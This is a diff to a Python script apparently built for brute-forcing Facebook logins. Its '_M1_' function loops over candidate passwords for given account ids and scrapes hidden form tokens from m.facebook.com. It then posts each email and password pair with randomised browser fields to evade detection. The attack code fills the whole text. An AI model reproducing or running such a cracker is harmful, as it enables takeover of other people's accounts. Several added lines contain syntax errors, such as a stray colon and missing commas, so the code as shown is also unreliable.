@@ -192,51 +192,31 @@ def _M1_(ids,pasx):
                 for ps in pasx:
                         session = requests.Session()
                         pro = random.choice(ugen)
-                        jazoest = ''.join(random.choices(string.digits, k=4))
-                        lsd = ''.join(random.choices(string.ascii_uppercase + string.digits, k=11))
-                        display = random.choice(['', 'touch', 'mobile'])
-                        isprivate = random.choice(['', 'false', 'true'])
-                        return_session = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
-                        skip_api_login = random.choice(['', '1'])
-                        signed_next = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
-                        trynum = str(random.randint(1, 10))
-                        timezone = str(random.randint(-720, 720))
-                        lgndim = ''.join(random.choices(string.ascii_letters + string.digits, k=44))
-                        lgnrnd = ''.join(random.choices(string.digits + '_', k=11))
-                        lgnjs = ''.join(random.choices(string.digits, k=10))
-                        prefill_contact_point = your_email
-                        prefill_source = random.choice(['browser_dropdown', 'browser_saved', 'messenger_code'])
-                        prefill_type = random.choice(['password', 'contact_point'])
-                        first_prefill_source = random.choice(['browser_dropdown', 'browser_saved', 'messenger_code'])
-                        first_prefill_type = random.choice(['password', 'contact_point'])
-                        had_cp_prefilled = random.choice(['true', 'false'])
-                        had_password_prefilled = random.choice(['true', 'false'])
-                        ab_test_data = ''.join(random.choices(string.ascii_letters + string.digits + '/', k=50))
-                        encpass = '#PWD_BROWSER:0:' + ''.join(random.choices(string.digits, k=10)) + ':' + ps
                         BLACKX = session.get('https://m.facebook.com').text
                         apple = data = {
-                        'jazoest': jazoest,
-                        'lsd': lsd,
-                        'display': display,
-                        'isprivate': isprivate,
-                        'return_session': return_session,
-                        'skip_api_login': skip_api_login,
-                        'signed_next': signed_next,
-                        'trynum': trynum,
-                        'timezone': timezone,
-                        'lgndim': lgndim,
-                        'lgnrnd': lgnrnd,
-                        'lgnjs': lgnjs,
+                        'jazoest':re.search('name="jazoest" value="(.*?)"', str(BLACKX)).group(1),
+                        'lsd':re.search('name="lsd" value="(.*?)"', str(BLACKX)).group(1),
+                        'display': random.choice(['', 'touch', 'mobile']),
+                        'isprivate': random.choice(['', 'false', 'true']),
+                        'return_session':re.search('name="return_session" value="(.*?)"', str(BLACKX)).group(1),
+                        'skip_api_login': random.choice(['', '1']),
+                        'signed_next': :re.search('name="signed_next" value="(.*?)"', str(BLACKX)).group(1),
+                        'trynum': str(random.randint(1, 10))
+                        'timezone':str(random.randint(-720, 720))
+                        'lgndim':re.search('name="lgndim" value="(.*?)"', str(BLACKX)).group(1),
+                        'lgnrnd':re.search('name="lgnrnd" value="(.*?)"', str(BLACKX)).group(1),
+                        'lgnjs':re.search('name="lgnjs" value="(.*?)"', str(BLACKX)).group(1),
                         'email': ids,
-                        'prefill_contact_point': prefill_contact_point,
-                        'prefill_source': prefill_source,
-                        'prefill_type': prefill_type,
-                        'first_prefill_source': first_prefill_source,
-                        'first_prefill_type': first_prefill_type,
-                        'had_cp_prefilled': had_cp_prefilled,
-                        'had_password_prefilled': had_password_prefilled,
-                        'ab_test_data': ab_test_data,
-                        'encpass': encpass}
+                        'pass' : ps
+                        'prefill_contact_point': ids,
+                        'prefill_source': random.choice(['browser_dropdown', 'browser_saved', 'messenger_code']),
+                        'prefill_type': random.choice(['password', 'contact_point']),
+                        'first_prefill_source': random.choice(['browser_dropdown', 'browser_saved', 'messenger_code']),
+                        'first_prefill_type': random.choice(['password', 'contact_point']),
+                        'had_cp_prefilled':  random.choice(['true', 'false']),
+                        'had_password_prefilled': random.choice(['true', 'false']),
+                        'ab_test_data':re.search('name="ab_test_data" value="(.*?)"', str(BLACKX)).group(1),
+                        'encpass': '#PWD_BROWSER:0:' + ''.join(random.choices(string.digits, k=10)) + ':' + ps}
                         tedy = {'authority': 'm.facebook.com',
                         'method': 'GET',
                         'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
